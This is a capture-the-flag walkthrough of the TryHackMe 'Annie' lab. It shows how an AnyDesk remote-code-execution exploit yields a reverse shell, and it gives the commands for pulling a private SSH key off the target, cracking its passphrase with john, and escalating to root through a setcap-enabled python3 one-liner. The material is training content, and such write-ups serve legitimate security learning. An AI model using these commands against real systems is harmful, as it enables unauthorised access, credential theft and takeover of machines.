TryHackMe <br>
Annie
---

# <b>Reconnaissance/Scanning:</b>
Starting with an `Nmap` scan to show what ports are open. I found 3 ports open with one running AnyDesk Client.

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/bbed2927-33be-4b29-a0a1-1434695e2801)

# <b>Vulnerability assessment:</b>
Since it’s a software running on that port, I checked `searchsploit` for any current exploits.

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/e446c647-a0af-40a0-925c-e298583d8581)

I ran into a bunch of type errors and syntax errors until I found an updated script
<a href=https://github.com/josephalan42/Exploits/blob/main/AnyDesk%205.5.2%20-%20Remote%20Code%20Execution>here</a> <br>
After changing the target IP in the script and using the `msfvenom` command to generate a shellcode,  <br>
updating the LHOST and LPORT parameters to my IP and port for the reverse shell,  <br>
I was able to finally execute the script correctly.

# <b>Exploit:</b>

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/4e4dba83-415f-400b-8faf-d31698126474)

```
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
```
Now that I have a shell, i'll upgrade it and see what can be found.

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/0d1ece4b-f83c-4eee-ab2a-e1c9ead565b0)

Looks like the first flag user.txt is there and some potential good information is the <b>.ssh</b> directory. <br>
Another good one would have been the <i>.bash_history</i> file for any user ran commands in previous sessions. <br>
Sadly, the <b>/dev/null</b> means that the history gets deleted.

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/27f2d05b-8b37-4f75-b21f-3f02cdd64cd8)

In the <b>Downloads</b> directory it’s confirmed that they are running the vulnerable version of AnyDesk. <br>
Accessing the <b>.ssh</b> directory there were a user’s private key and the <i>authorized_keys</i> file. <br>
I set up a python server and downloaded them to my local machine.
```
# python server on target machine
$ python3 -m http.server <PORT>

# on local machine
$ wget http://<TARGET_MACHINE_IP>:<PORT>/path/to/file
```
From there I looked at the <i>authorized_keys file</i> but didn’t find any usernames or plaintext credentials. <br>
I tried to SSH as Annie on the machine with: <br>
```
$ ssh annie@<machine_IP> -I id_rsa
```
And I was prompted with:

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/621323ec-58b5-450c-994f-29965552826b)

That’s good practice to passphrase protect the private key, however, I’ll still try to crack it. <br>
To get that ready for `john` to crack that, I’ll have to make the file a hash with `ssh2john` first.
```
# hashing the file
$ ssh2john id_rsa > hash.txt

# cracking the hash with john
$ john hash.txt -w=/usr/share/wordlists/rockyou.txt
```
Didn’t take too long to crack that!

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/a4130268-279d-4ad7-bdc8-3cd200f38d1e)

# <b>Privilege escalation:</b>
My next step was to see if there were any files/binaries I could run with higher privileges.
```
$ find / -perm -u=s -type f 2>/dev/null
```
![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/a127ba8d-c073-4009-b5c8-edc3e05f629a)

Awesome! Something I can run with higher privileges. <br>
`Setcap` lets a user set file capabilities/permissions. <br>
So, thinking through this, what could I give the user extended permissions to be able to escalate my privileges? <br>
Python would be a good one since there are python one-liners to use for gaining shells!
```
# copying python3 to the user’s home directory
$ cp /usr/bin/python3 /home/annie

# checking the permissions for python3 
$ getcap -r python3

# setting the extended permissions for python3
$ setcap cap_setuid+ep python3
```
![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/7160c0a2-d582-4de3-a3f0-93a2ccf3aac7)
![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/c87cbb18-1275-46e0-a5f9-cc99b5a3c4f3)

When checking the permissions the first time, nothing is returned, meaning there are no extended permissions set. <br>
The second time checking after executing the setcap command, python3 is showing having the extended permissions set. <br>
Now for the python one-liner:
```
$ ./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/89db561b-4b8f-4ad8-b2e9-f6917d5083a8)

# <b>Reporting:</b>
Keep all software/firmware up to date with the latest patches to avoid vulnerabilities. <br>
Check that files have correctly set user/group permissions.


























